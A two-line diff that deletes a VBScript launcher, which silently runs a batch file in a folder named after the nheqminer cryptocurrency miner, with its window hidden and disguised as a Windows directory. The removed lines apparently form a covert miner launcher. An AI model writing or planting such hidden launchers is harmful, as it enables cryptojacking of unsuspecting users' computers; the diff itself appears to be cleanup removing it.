@@ -1,2 +1,0 @@
-Set shell=WScript.CreateObject("WScript.shell") 
-shell.run("C:\Windows_x64_nheqminer-5c\z.bat"),0,True
